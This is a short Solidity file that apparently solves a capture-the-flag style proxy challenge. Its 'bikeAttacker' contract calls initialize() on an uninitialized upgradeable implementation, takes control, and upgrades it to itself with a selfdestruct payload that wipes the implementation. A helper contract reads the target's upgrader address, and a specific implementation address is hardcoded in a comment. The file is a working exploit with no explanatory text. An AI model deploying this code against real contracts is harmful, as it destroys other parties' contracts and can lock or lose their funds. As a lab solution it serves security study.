// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

//Implemntation
//0x2968B0d0514c15Fc39880846EF9A3F161BabC61f

interface IEngine {
    function upgrader() external view returns (address);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract bikeAttacker {
    function pwn(IEngine target) external {
        target.initialize();
        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() external{
        selfdestruct(payable(address(0)));
    }
}

contract Upgraderaddress {
    address public upgrder;
    IEngine public target;

    function setTarget(address _target) public {
        target=IEngine(_target);
    }

    function adr() public {
        upgrder = target.upgrader();
    }
}
